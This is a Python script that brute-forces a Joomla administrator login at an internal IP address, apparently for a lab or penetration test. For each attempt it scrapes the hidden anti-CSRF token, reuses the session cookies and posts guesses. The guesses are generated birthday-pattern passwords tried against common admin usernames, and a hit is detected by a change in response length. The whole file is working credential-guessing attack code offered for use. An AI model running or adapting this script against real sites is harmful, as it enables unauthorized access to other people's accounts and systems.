from requests import get, post
import re

url = "http://192.168.232.25/administrator/index.php"


# body 
# username=ygyyaskz
# &password=1111
# &return=aHR0cDovLzE5Mi4xNjguMjMyLjI1L2luZGV4LnBocC9jb21wb25lbnQvdXNlcnMvP3ZpZXc9b
# G9naW4mSXRlbWlkPTEwMQ%3D%3D
# &528d259af1777445b74833f8d333d6e5=1 

def brute(_username, _password):
    headers = {
        "Keep-Alive": "1",
        "User-Agent": "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.4) Gecko/20030624 Netscape/7.1 (ax)"
    }

    req = get(url=url)
    
    ssrf_token = re.findall(r"<input type=\"hidden\" name=\"(.+)\" value=\"1\" />", req.content.decode("utf-8"))[0]
    
    cookies = req.cookies

    data = {
        "username": _username,
        "passwd": _password,
        "option": "com_login",
        "task": "login",
        "return": "aW5kZXgucGhw",
        ssrf_token: "1"
    }

    req = post(url=url, data=data, headers=headers, cookies=cookies).content.decode("utf-8")
   
    print(f"[+] Trying Username {_username} Password {_password} Resp_length {len(req)}")
    if (len(req) != 5361):
        print(f"[!] possibly password: {_password}")
        input()

def generate_passlist_birthday(_username):
    for i in range(1, 13):
        for j in range(1, 32):
            mm = str(i)
            if len(mm) == 1:
                mm = "0" + mm
            dd = str(j)
            if len(dd) == 1:
                dd = "0" + dd
            yield f"{_username}{mm}{dd}"

if __name__ == "__main__":
    #passwords = open("dict.txt", "r", encoding="utf-8").readlines()
    username = [
        #"ygyyafkz", 
        "admin", 
        "joomla", 
        "Joomla"
        ]
    for _username in username:
        password = generate_passlist_birthday("ygyyafkz")
        for _password in password:
            brute(_username, _password)
    
